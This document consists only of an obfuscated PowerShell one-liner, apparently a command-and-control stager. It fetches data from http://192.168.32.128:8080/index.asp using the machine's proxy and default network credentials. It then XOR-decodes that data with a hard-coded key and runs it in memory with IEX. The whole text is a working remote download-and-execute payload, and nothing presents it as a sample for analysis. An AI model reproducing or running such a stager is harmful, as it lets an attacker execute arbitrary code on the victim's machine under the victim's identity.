
$Wc=NEW-OBJECT SYStem.NET.WEBCLIEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDERs.ADd('User-Agent',$u);$wc.PROxY = [SysTEm.NET.WEBReQUesT]::DefaUltWeBPRoxy;$WC.PRoXY.CREDEntiAls = [SystEM.NeT.CrEdentiALCaCHE]::DEFaUltNEtwOrKCrEdeNtIaLS;$K='f04e1fd4cbfeecfdce8aa2ad6e9cf4ac';$I=0;[cHAr[]]$b=([chAR[]]($Wc.DoWnlOadSTRinG("http://192.168.32.128:8080/index.asp")))|%{$_-bXor$k[$i++%$k.LeNGTH]};IEX ($B-Join'')

